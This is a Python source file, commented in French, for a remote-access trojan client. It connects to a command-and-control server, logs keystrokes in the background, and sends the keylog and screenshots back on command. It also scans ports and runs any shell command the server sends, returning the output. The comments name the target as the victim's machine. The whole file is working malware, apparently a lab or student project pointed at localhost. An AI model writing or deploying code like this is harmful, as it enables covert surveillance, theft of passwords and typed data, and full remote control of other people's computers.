import socket
import subprocess
import threading
from pynput import keyboard
import pyautogui
import io

ip_address = '127.0.0.1'
port_number = 1234
keylog_file = "keylog.txt"

def start_keylogger():
    """
    Fonction pour démarrer le keylogger
    """
    def on_press(key):
        try:
            with open(keylog_file, "a") as f:
                if hasattr(key, 'char') and key.char is not None:
                    f.write(key.char)
                else:
                    if key == keyboard.Key.space:
                        f.write(" ")
                    elif key == keyboard.Key.enter:
                        f.write("\n")
                    elif key == keyboard.Key.backspace:
                        f.seek(0, 2)
                        size = f.tell()
                        if size > 0:
                            f.seek(0, 0)
                            data = f.read(size - 1)
                            f.truncate(0)
                            f.write(data)
                    elif key == keyboard.Key.tab:
                        f.write("\t")
                    else:
                        pass
        except Exception as e:
            pass
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def connect_to_server():
    """
    Fonction pour établir une connexion avec le serveur et traiter les commandes reçues.
    """
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))

    """ Démarre le keylogger dans un thread séparé """
    threading.Thread(target=start_keylogger, daemon=True).start()

    """ Boucle principale pour recevoir et exécuter les commandes """
    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'exit':
                """ Stop le serveur C2 """
                cs.send(b'quit')
                break

            elif command.lower() == 'keylog':
                """ Résultat du keylogger de la machine de la victime """
                try:
                    with open(keylog_file, "r") as f:
                        keylog_content = f.read()
                    cs.send(keylog_content.encode())
                except FileNotFoundError:
                    cs.send(b"Keylog file not found.")

            elif command.lower() == 'screenshot':
                """ Capture d'écran sur la machine de la victime """
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                buffer.seek(0)

                cs.send(str(len(buffer.getvalue())).encode())
                cs.recv(1024)

                cs.sendall(buffer.getvalue())
                continue

            elif command.startswith("scan"):
                """ Scanne des ports ouverts """
                parts = command.split()
                if len(parts) != 3:
                    cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
                    continue
                _, start_port, end_port = parts
                open_ports = scan_ports(int(start_port), int(end_port))
                output = f"Ports ouverts sur {ip_address}: {open_ports}"
                cs.send(output.encode())
                continue

            else:
                """ Exécute toute autre commande système """
                result = subprocess.run(command, shell=True, capture_output=True, text=True)

                output = result.stdout + result.stderr
                if not output:
                    output = "Commande executée, pas de sortie !."

                cs.send(output.encode())

        except ConnectionResetError:
            break
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            break

    cs.close()

def scan_ports(start_port, end_port):
    """
    Fonction pour scanner des ports dans une plage donnée et retourner ceux qui sont ouverts.
    """
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            pass
    return open_ports

if __name__ == "__main__":
    connect_to_server()
